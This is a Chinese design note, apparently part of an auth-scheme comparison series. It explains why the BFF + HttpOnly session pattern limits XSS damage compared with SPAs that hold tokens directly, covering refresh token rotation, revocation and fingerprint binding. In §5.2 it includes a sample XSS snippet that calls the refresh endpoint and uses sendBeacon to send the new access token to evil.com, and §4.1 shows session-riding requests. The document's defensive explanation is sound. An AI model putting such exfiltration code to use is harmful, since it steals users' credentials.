# 方案 G:BFF + Session(2024+ OAuth WG 新推荐)

> 返回 [索引](./跨服务鉴权方案分析.md)
> 横向跳转:[A](./方案A-独立账号.md) · [B](./方案B-对称密钥前端持JWT.md) · [C](./方案C-对称密钥Cookie兜底.md) · [D](./方案D-非对称密钥JWKS.md) · [E](./方案E-TokenExchange.md) · [F](./方案F-OAuth2授权码PKCE.md) · **G** · [H](./方案H-API网关验签.md)

---

## 1. 业界转向

OAuth Working Group 在 [draft-ietf-oauth-browser-based-apps](https://datatracker.ietf.org/doc/draft-ietf-oauth-browser-based-apps/) 草案中**反转了之前的推荐**:

> 浏览器 SPA 不应直接持有 access_token。推荐改为 **BFF(Backend for Frontend)** 模式:
> - SPA 与 BFF 之间用传统 session cookie(HttpOnly)
> - BFF 持有 OAuth2 token,代理调用 resource server

## 2. 原理

```
┌──────────┐                          ┌──────────────┐
│ Browser  │ ──session cookie──→     │     BFF      │
│   SPA    │                          │  (持 token)  │
└──────────┘                          └──────────────┘
                                            │
                              Bearer access_token
                                            ↓
                              ┌─────────────────────────┐
                              │  IdP / Resource Server  │
                              └─────────────────────────┘
```

## 3. 为什么 2024+ 推荐 BFF

| 问题 | SPA 直持 token([方案 F](./方案F-OAuth2授权码PKCE.md)) | BFF(G) |
|---|---|---|
| token 存哪 | 内存 / localStorage,XSS 可偷 | 服务端 session,JS 拿不到 |
| token 撤销 | 难 | 易(BFF 删 session 即可) |
| Chrome 第三方 cookie | 不影响(token 在 JS) | BFF 与 SPA 同源,无影响 |
| refresh_token 暴露 | 必须 HttpOnly cookie(增加复杂度) | 完全在 BFF |

**核心动机**:浏览器环境的 XSS 风险无法根除(npm 投毒、第三方 script、扩展),把 token 留在 JS 就一直有风险。BFF 把这层风险隔离掉。

详细的 SPA + PKCE 信任根弱点分析见 [方案 F §11-14](./方案F-OAuth2授权码PKCE.md#11-安全前提verifier-的可信度依赖)。

## 4. 安全模型澄清:为什么 BFF 不只是"换个名字"

> 这一节回答一个真实的质疑:"AT 和 session ID 本质都是一个 key,你叫它 session 就比叫 AT 安全了?攻击者偷 session ID 跟偷 AT 有什么区别?"

### 4.1 直觉的部分:XSS 发生那一刻,BFF 也救不了

XSS 一旦注入到 SPA 的 origin,**不论凭证存哪**,攻击者都能在受害者浏览器里直接发起请求:

```js
// SPA 直持 AT 时:
fetch('/api/agent/data', {
  headers: { Authorization: 'Bearer ' + stolenAT },
});

// BFF 模式下(JS 读不到 session cookie,但浏览器会自动带):
fetch('/bff/agent/data', { credentials: 'include' });
// 浏览器自动带 HttpOnly session cookie → BFF 收到 → 用它持有的 AT 调 agent-server
```

**两种场景攻击都能成功调到 resource server。** 这叫 **session riding / in-browser request**,是 cookie 鉴权的经典攻击向量。

所以"BFF 只是换了个名字"在**攻击成功命中那一刻**,确实对。

### 4.2 但本质区别在"爆炸半径"

关键的区分维度不是"攻击能不能发生",而是**攻击发生后,凭证能不能离开受害者的浏览器**。

把所有鉴权凭证按"能否被 exfiltrate(外带)"分两类:

| 凭证类型 | 攻击者能做什么 |
|---|---|
| **能 exfiltrate**(localStorage / JS 内存里的 AT / non-HttpOnly cookie) | 可在自己机器存下来、可持久使用、可分享转卖、可在受害者关 tab 后继续用、可批量收割 |
| **不能 exfiltrate**(HttpOnly session cookie) | 只能在受害者浏览器内 in-browser 触发请求,受害者关 tab / session 撤销即停 |

**BFF 的核心安全收益,是把鉴权凭证从"能 exfiltrate"族群挪到"不能 exfiltrate"族群。**

### 4.3 真实威胁模型对照表

把各种攻击场景逐个推一遍——这才是 BFF 真正的价值所在:

| 威胁场景 | SPA 直持 AT(方案 F) | BFF + HttpOnly session(方案 G) |
|---|---|---|
| XSS 注入即时调 API | ✅ 成功 | ✅ 成功(session riding) |
| 攻击者把凭证存到自己机器 | ✅ AT 是字符串,可外带 | ❌ JS 读不到 cookie 值,无法外带 |
| 攻击者持续调 API 数月 | ✅ 直到 AT 过期(若 30 天) | ❌ 受害者关 tab / 撤销 session 即停 |
| 攻击者分享 / 转卖凭证 | ✅ token 字符串可任意传播 | ❌ session cookie 离开该浏览器实例无效 |
| refresh_token 被偷,永续续期 | ✅ 灾难性,撤销难 | ❌ refresh_token 完全在 BFF 服务端 |
| 攻击者下线后受害者继续被薅 | ✅ AT 仍有效 | ❌ 无可乘之机 |
| 批量收割多用户凭证 | ✅ 注入页面 → 集中外带到攻击者服务器 | ❌ 凭证无法离开各自浏览器 |
| BFF 端可做异常行为检测 / 限流 | ❌ resource server 缺少 client 上下文 | ✅ BFF 是单一进出口 |

**对照表里 SPA 直持 ❌ 的全是"凭证泄漏后可持久、可放大、可分发"的攻击。BFF 把这些全堵死,只保留"受害者在线期间的 in-browser 调用"这一窄口子。**

### 4.4 HttpOnly 的真正价值是"防外带",不是"防使用"

很多教程把 HttpOnly 描述成"防 XSS",这不准确。HttpOnly 准确的描述应该是:

> **阻止 token 被序列化为字符串后离开浏览器,但不阻止浏览器使用它发请求。**

类比:你能让快递员凭工牌进出小区(浏览器自动带 cookie),但工牌**焊在工牌套里**,他没法把工牌借给外面的人。攻击者能"借用快递员的身份",但只能在快递员在场时;他没法把工牌拿走、复制、分发。

### 4.5 BFF 能叠加的额外防御层

把鉴权凭证收敛到 BFF 后,可以做 SPA 直持永远做不到的事。**这些才是 BFF 的全部安全收益**:

| 防御 | 怎么做 | SPA 直持能做吗 |
|---|---|---|
| **极短 AT TTL(1-5 min)** | BFF 持 refresh_token 自动管刷新,SPA 完全无感 | ❌ SPA 直持时短 TTL 会频繁触发交互,体验崩 |
| **异常行为检测** | BFF 监控每用户调用频率、地理位置、请求 pattern,异常时自动 invalidate session | ❌ resource server 没有"per client" 视角 |
| **per-client 限流** | 攻击者高频 session riding,BFF 限流第一时间察觉 | ❌ resource server 只看用户维度,看不出"同用户多源" |
| **Origin / Referer 校验** | BFF 可拒绝来自非可信 origin 的请求,挡住跨站攻击(同 origin XSS 仍能过) | ⚠ resource server 也能做,但通常没做 |
| **CSRF token 二次验证** | BFF 与 SPA 间加 CSRF token 双提交,即使 session riding 也得读 CSRF token(读得到但增加成本 + 易触发监控) | ❌ Bearer 鉴权无 CSRF 风险也无 CSRF 防御 |
| **Session 即时撤销** | 用户改密码 / 报告异常 → BFF 删 session → 攻击立即失效 | ❌ JWT-AT 撤销需黑名单 + 等过期 |
| **集中审计日志** | BFF 记录所有出入流量,便于事后追溯 | ❌ resource server 看不到 client 上下文 |
| **refresh rotation 不暴露** | refresh_token 永远在 BFF,可做完整 rotation + 重放检测 | ❌ refresh 也要在 SPA,XSS 一锅端 |

### 4.6 类比:银行卡 vs 网银 session

- **SPA 直持 AT** 像是把**银行卡**交给用户。卡丢了 → 别人在任何 ATM 都能刷,直到挂失;能复制、能转手、能远距离作案
- **BFF + HttpOnly session** 像是**网银 session**。攻击者控制了你电脑能在你登录窗口内乱操作,但他**关掉你电脑就操作不了**;且他没法把 session 转移到别的设备;银行端能看出"同账户异常操作"

两种攻击都存在,但**前者的损失能跨设备、跨时间无限放大;后者被锁在受害者当前的浏览器实例 + 当前的活跃 session 里**。

### 4.7 完整结论

正确表述是:

> **BFF 不是"防 XSS",而是把 XSS 的攻击窗口从"token 生命周期"压缩到"XSS 注入存在期间 ∩ 受害者在线时间"的交集。**

这跟其他安全机制叠加(CSP 防 XSS 注入、CSRF token 防 session riding、限流防爆量、监控防异常)才是完整的**纵深防御**。

**单独看 BFF 不阻止任何一类攻击,但作为最底层的凭证隔离,它把"灾难性、可放大、可持久、跨设备"的后果全堵死,只剩"可监控、可干预、可恢复"的窗口期攻击。** 这就是 OAuth WG 2024+ 把 SPA 推向 BFF 的真正动机——不是因为 BFF 防 XSS,而是因为 SPA 一旦中招,SPA 直持 token **损失不可控**,而 BFF 模式下损失始终在可控范围内。

### 4.8 反过来说:什么时候 BFF 的安全收益不重要

诚实地说,如果你的场景满足以下**全部**条件,BFF 的安全收益就不显著:

- AT TTL 本来就很短(< 5 min)
- 没有 refresh_token,过期就重新交互
- 业务无敏感操作(没钱、没隐私、没破坏性 API)
- 用户群可控(内部工具),无大规模批量收割动机

这种场景下 SPA 直持 + 短 AT TTL + CSP 已经够了,BFF 是过度设计。**所以本项目 MVP 不上 BFF 的判断仍然正确**,这一节是说"懂了 BFF 的价值,才能判断什么时候不需要它"。

## 5. 深入:双 token 与 session 失效的真实机制

> 这一节回答另外两个真实的追问:
> 1. "AT 和 RT 都放客户端,双 token 跟单一长 AT 有什么区别?偷 RT 不一样完蛋?"
> 2. "你说关 tab session 就失效——具体怎么实现?攻击者偷 session ID 不也能跨设备替代用户?"
>
> 这两个问题精准命中了认证体系最常被糊弄的地方。展开严肃回答。

### 5.1 SPA 直持双 token 的最初设计动机

OAuth 2.0 的双 token 设计来自一个朴素的安全直觉:

- **AT(Access Token)短期**(5-60 min):频繁送给 resource server,暴露面大,所以短命限制风险
- **RT(Refresh Token)长期**(数天到数月):只送给 IdP 的 `/refresh` 端点,使用频率低,暴露面小

理想模型:**AT 频繁使用但短命,RT 使用少所以可以长寿**。

### 5.2 但 SPA 上这个模型为什么崩塌

双 token 的安全收益**完全依赖 RT 的暴露面真的比 AT 小**。SPA 上有三种存法,逐个检验:

#### 存法 A:AT 和 RT 都在 localStorage / JS 内存

- XSS 一锅端,两个 token 同时泄漏
- **比单一长 AT 更糟**——攻击者拿到 RT 后可以**永续刷新**,期间 AT 不断更新,撤销难度上升
- 这是初学者最常犯的错误,网上半数教程在教

#### 存法 B:AT 内存 + RT HttpOnly cookie(主流做法)

- ✅ RT 不能被 JS 读取,无法 exfiltrate
- ❌ 但 session riding 仍可:XSS 注入后,攻击者 `fetch('/refresh', { credentials: 'include' })` → 浏览器自动带 RT cookie → 返回新 AT 在 JS 上下文里 → 攻击者外带 AT

```js
// XSS 注入代码:
const res = await fetch('/refresh', { credentials: 'include' });
const { accessToken } = await res.json();
navigator.sendBeacon('https://evil.com', accessToken);  // 外带新 AT
```

**RT 本身偷不走,但 RT 派生的 AT 仍能被偷。**

#### 存法 C:AT 和 RT 都 HttpOnly cookie

- 退化为类 BFF 模型——但这又面临一个问题:resource server 通常不接受 cookie 鉴权,所以 AT 还是得在某个时间点暴露给 JS 才能塞进 `Authorization` 头
- 真正彻底的解法就是上 BFF(本文方案 G)

### 5.3 那双 token 还剩什么价值?Rotation 是灵魂

存法 B(AT 内存 + RT HttpOnly)虽然不完美,但相比单一长 AT,**只在加上 Refresh Token Rotation 时才有真实安全价值**。

#### 什么是 Refresh Token Rotation(RFC 6749 BCP / OAuth 2.1)

每次用 RT 换 AT 时,IdP **返回新的 RT,旧 RT 立即作废**。同一时刻只有最新一根 RT 有效,形成一条单向链(token family)。

#### Rotation 怎么自动检测攻击

```
正常用户使用:
  RT1 ──/refresh──→ IdP ──→ { AT1', RT2 }  (RT1 作废,RT2 生效)
  RT2 ──/refresh──→ IdP ──→ { AT2', RT3 }  (RT2 作废,RT3 生效)

攻击者偷 RT1 后:
  攻击者 ─RT1─→ IdP ──→ { AT', RT2' }  (RT1 作废,RT2' 生效)

  受害者下次刷新,带的还是 RT1:
  受害者 ─RT1─→ IdP ──→ 检测到!"已作废的 RT 又被使用"

  → 这是 token family 被 fork 的明确信号
  → IdP 立即作废整个 token family(包括攻击者拿到的 RT2')
  → 通知受害者重新登录
```

**没有 rotation 的双 token = 安全噱头**,跟单一长 AT 一样,偷了就完蛋。
**有 rotation 的双 token**,把攻击者的窗口压缩到"偷到 RT → 第一次 refresh → 受害者下次 refresh 之间",一旦受害者再 refresh,token family 立即烧毁。

#### 双 token 的其他收益(rotation 不直接相关)

| 收益 | 说明 |
|---|---|
| **撤销粒度** | 只撤当前 RT 不影响其他;撤 token family 影响该用户该设备所有衍生 token,精确控制 |
| **scope 隔离** | AT 可携带细粒度 scope(读 / 写 / agent 专用),RT 是 master |
| **审计精度** | refresh 端点流量异常可识别"凭证被滥用",单 AT 模型无此观察点 |
| **不同 resource server 不同 AT** | 一个 RT 可派生多个 audience 不同的 AT |

#### 结论(诚实)

> 双 token 设计**只在 RT 真正受保护 + 配合 rotation + 服务端能立即撤销 family** 三件事都满足时才有安全价值。
> 任何一个不满足 → 双 token 跟单一长 AT 等价甚至更糟。

很多项目"上了双 token 就觉得安全",但既没 rotation 也没 family 撤销,这就是噱头。

### 5.4 Session "失效" 不是关 tab 这么简单

前面 §4 说过"受害者关 tab 即停"——这是简化说法,**精确机制要拆开讲**。

#### Cookie 本身的生命周期

| Cookie 类型 | 何时清除 |
|---|---|
| **Session Cookie**(无 `Max-Age` / `Expires`) | 浏览器**关闭进程**时清(不是关 tab) |
| **Persistent Cookie**(有 `Max-Age`) | 到期才清,关浏览器也保留 |

**关 tab 不会让 session cookie 清除。** 现代浏览器(Chrome / Edge / Safari)还有"恢复上次会话"功能,即使关浏览器进程,session cookie 也可能保留。

#### Server-side Session 的真正失效机制

让 session 失效的**实际是服务端**,不是浏览器:

| 机制 | 怎么工作 |
|---|---|
| **Sliding TTL** | Redis `EXPIRE` 设 30 min,每次请求 `EXPIRE` 重置——30 min 无活动 → 自动过期 |
| **Absolute Expiration** | 创建时记录 `created_at`,无论活跃否,X 天后必失效 |
| **主动撤销** | 用户登出 / 改密码 / 报告异常 → `DEL session:abc123` |
| **强一致登出** | 登出端点立即删 Redis store + 同时把 cookie 设过期(双保险) |

#### 修正之前的措辞

之前 §4 说"受害者关 tab 即停"不严谨。**精确表述**:

> 攻击者只能在 **server-side session 仍然有效 + 浏览器仍持有 session cookie** 的交集时间段内作案。
> 关 tab 不让 session 失效,但**用户登出 / TTL 到期 / 改密** 让 server-side session 失效——之后即使浏览器仍带 cookie,服务端查 Redis 找不到也无效。

#### "无感主动撤销"是 SPA 直持 AT 做不到的关键能力

| 撤销手段 | SPA 直持 AT | BFF session |
|---|---|---|
| 用户改密 → 让旧 token 全部失效 | ❌ AT 已签发难撤,要黑名单 + 等过期 | ✅ DELETE session,下次请求即 401 |
| 异常检测 → 立即冻结 | ❌ 同上 | ✅ 即时生效 |
| 用户主动登出全部设备 | ❌ 黑名单全部 user_id 关联 token,复杂 | ✅ `DEL session:user:42:*` |

### 5.5 攻击者偷到 session ID 后能跨设备替代用户吗?

这是最关键的追问——我们直面它。

#### 理论上能,实际上极难

理论上 session ID 就是一个字符串,放进 cookie 调 BFF 就能用。但 **HttpOnly + 多层防御让 "偷 session ID" 远比 "偷 AT" 难得多**:

| 防御层 | 怎么挡住攻击 |
|---|---|
| **HttpOnly** | JS 读不到 cookie 值,**攻击者无法把字符串外带到自己服务器** ← 这是核心 |
| **Secure** | 强制 HTTPS,中间人嗅探不到 cookie |
| **SameSite=Strict / Lax** | 其他站点发起的请求**不带 cookie**,跨站攻击者站点上的 JS 无法借用 |
| **Server-side 指纹绑定** | session 创建时记录 user-agent / IP 段 / TLS 指纹,**跨设备使用 = 指纹不符 → 服务端拒绝** |
| **持续异常检测** | 同 session ID 突发地理跳变 / 流量突增 → BFF 立即 invalidate |

#### XSS 能不能绕过这些?

逐项推:

- **绕过 HttpOnly 直接读** → ❌ 不行,这是浏览器底层强制
- **触发请求让浏览器自动带 cookie** → ✅ 可以(session riding,§4.1 已承认)
- **把请求结果外带** → ✅ 可以(响应 body 在 JS 上下文)
- **把 cookie 本身外带** → ❌ 不行,JS 读不到 cookie 字符串

**所以攻击者只能"借用受害者浏览器作请求中继",不能"获取一份可独立使用的凭证"。**

这两者在工程实战中差异巨大:

| 场景 | 借用浏览器作中继(session riding) | 获取独立凭证(AT 外带) |
|---|---|---|
| 必须在受害者浏览器内 | ✅ 必须 | ❌ 不必,自己机器随便用 |
| 受害者关浏览器 / 登出 | ✅ 立刻失效 | ❌ 不影响 |
| 攻击者可分享 / 转卖 | ❌ 无凭证可分享 | ✅ token 字符串可任意传播 |
| 攻击者可批量收割 | ❌ 每个受害者要单独维持 in-browser channel | ✅ 集中收集到攻击者服务器 |
| BFF 可监控 / 限流 / 触发指纹 | ✅ 异常 pattern 易识别 | ❌ resource server 缺 client 上下文 |
| 攻击者跨设备使用 | ❌ 指纹绑定 + IP / UA 校验拦截 | ✅ 字符串到任何设备都能用 |

#### 那受害者本人换设备 / 网络怎么办?

合理质疑——指纹绑定不能太严,否则用户切 WiFi / 换地铁就被登出。实际工程上的指纹策略是**分层**的:

- **强指纹**:user-agent 大版本号(浏览器主版本,不含小版本号 → 容忍自动升级)
- **弱指纹**:IP 段 /24(允许同段内 NAT 切换)、地理位置(同城内合理切换)
- **触发额外验证**:跨大洲、跨设备类型、TOR 出口 → 弹二次验证(不直接登出,提示"是你本人吗")

这就是 GitHub / Google 等"检测到异地登录,请确认"的实现原理。

### 5.6 AT 与 Session ID 的根本不对称

回到用户最初的质疑:**"AT 和 session ID 本质都是 key,叫什么名字有区别吗?"**

**字符串本身没区别,真正不对称的是它们各自所处的"安全契约"**:

| 维度 | AT(JWT,典型) | Session ID(典型) |
|---|---|---|
| 自包含信息 | ✅ 是,内含 user/exp/scope | ❌ 不,只是查 store 的 key |
| 验证方式 | 验签 O(1),无状态 | 查 Redis O(1+ 网络),有状态 |
| 撤销 | 难(需黑名单 + 等过期) | 易(`DEL key`) |
| 信息泄漏 | base64 解码可看用户信息 | 完全不透明 |
| 服务端可跨实例同步状态 | 不必,token 自带 | 必须(Redis / DB 共享) |
| 设备 / 指纹绑定 | 不便(JWT 是无状态的) | 自然(session 记录指纹) |
| 撤销粒度 | 全用户 / 全 client | 单 session / 单设备 |

**真正的差异是:Session ID 强制配套了一整套服务端验证机制——撤销、指纹、过期、限流、监控。AT(JWT) 的"无状态优势"反过来意味着这一切机制都缺失。**

所以问题不是"叫什么名字",而是:**采用 session 模型 = 自动获得这一整套服务端介入能力;采用纯 JWT 模型 = 主动放弃这些能力换取无状态扩展性。**

这两种模型本来就是为不同场景设计的:
- **JWT / AT 模型**:微服务间机器到机器(M2M)、可无状态横向扩展
- **Session 模型**:用户面前端、需要细粒度可控、需要立即响应安全事件

BFF + session 模式其实是**把"对前端的鉴权 = session 模型"和"对资源服务器的鉴权 = JWT/AT 模型"两件事拆开**,各自用最合适的工具。

### 5.7 总结

| 你的疑问 | 严谨答案 |
|---|---|
| 双 token 在 SPA 上有意义吗? | **配合 RT rotation + family 撤销时有,单纯放两个 token 没有** |
| 偷 RT 不一样完蛋? | 没 rotation 一样完蛋;有 rotation 时偷了能用一次,之后受害者下次 refresh 即触发 family 烧毁 |
| 关 tab 让 session 失效是怎么实现的? | 关 tab **不会**让 session 失效;server-side TTL / 主动撤销 / 用户登出才会;之前措辞不严谨,精确表述见 §5.4 |
| 偷 session ID 能跨设备用吗? | HttpOnly 阻止字符串外带 + 服务端指纹绑定阻止跨设备 + 异常检测立即撤销;**理论可能,工程上极难** |
| AT 和 session ID 本质都是 key,有区别吗? | 字符串本身无区别,**真正不对称的是各自配套的服务端能力**——session 自带撤销 / 指纹 / 监控,JWT 选择无状态而放弃这些 |

## 6. 跟传统 BFF 的区别

传统 BFF(Netflix 等提的)主要是为了"聚合多个后端、为前端定制 viewModel"。OAuth WG 推的 BFF 是**纯安全目的**——可以非常薄,只做 session + token 代理,不动业务。

## 7. 代价

- 必须再起一个进程(BFF)
- 多一跳延迟(SSE 流式场景敏感 —— LLM 逐 token 体感会下降)
- 部署 / 监控 / 扩缩容多一份成本

## 8. 适用场景

- 高安全要求的 SPA(银行 / 医疗 / 政务)
- 已经有 BFF 用作 viewModel 聚合,顺便接管 token
- 团队同时维护 Web + Native,Native 走直连,Web 走 BFF

## 9. 不适用场景

- 业务需要超低延迟的流式响应(本项目 LLM token 流就敏感)
- 单一前端 + 单一后端的小型项目(过度设计)
- MVP / 演示项目(运维成本不划算)

---

## 横向关联

- **跟 [方案 F](./方案F-OAuth2授权码PKCE.md) 的关系**:G 是 F 在 SPA 上的"安全加固"——把 token 持有者从 SPA 搬到 BFF
- **跟 [方案 H](./方案H-API网关验签.md) 的关系**:G 的 BFF 是"前端定制",H 的 gateway 是"统一鉴权",层级不同但都属于"代理鉴权"
- **跟 [方案 C](./方案C-对称密钥Cookie兜底.md) 的关系**:都用 HttpOnly session cookie,但 G 的 cookie 是 BFF 自家发的,跟 resource server 完全无关;C 的 cookie 是 resource server 直接接受
- **多端场景**:Web 走 BFF,Native 走 [方案 F](./方案F-OAuth2授权码PKCE.md) 直连 IdP,两端协议一致但实现路径不同
